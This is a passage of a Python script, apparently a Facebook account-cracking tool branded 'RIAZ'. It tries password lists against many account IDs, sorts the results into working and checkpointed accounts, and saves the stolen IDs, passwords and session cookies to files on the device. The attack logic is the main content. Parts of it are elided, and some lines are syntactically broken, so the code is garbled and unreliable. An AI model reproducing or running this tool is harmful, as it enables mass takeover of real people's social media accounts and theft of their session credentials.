...
\033[1;32m(√) \033[1;34mON FACEBOK   :  \033[1;34m 🥀RIAZ🙃
...
def passwrd():
	...
	print('')
	print(f'👉RESULTS {h}RIAZ-OK{u} CHEK : {h}OK/%s {b}'%(okc))
	print(f'👉RESULTS {k}RIAZ-CP{h} CHEK : {k}CP/%s {b}'%(cpc))
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{b}RIAZ-CRACKING-->{P}[{k}{loop}{P}/{h}{len(id)}{P}]—{P}[{H}{RIAZ-ok}{P}]—{P}[{k}{RIAZ-cp}{x}]—[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				open('RIAZ-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
				...
				open('RIAZ-OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				open('RIAZ-OK/'+okc,'a').write(idf+'|'+pw+'\n')
				cek_apk(session,coki)
				break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/PINK-RIAZ/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/RIAZ-KHAN/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='RIAZ🙃 OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/PINK-RIAZ/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='RIAZ-KHANCP'))
					open('/sdcard/PINK-RIAZ/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
...
def ceker(idf,pw):
	...
	try:
		...
		print('\r%s++++ %s|%s ----> RIAZ-CP💔       %s'%(b,idf,pw,x))
		...
		try:
			...
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					...
					print('\r%s++++ %s|%s ----> RIAZ-CP💔       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
				...
				print('\r%s++++ %s|%s ----> RIAZ-OK🙃       %s'%(h,id,pw,x))
			else:
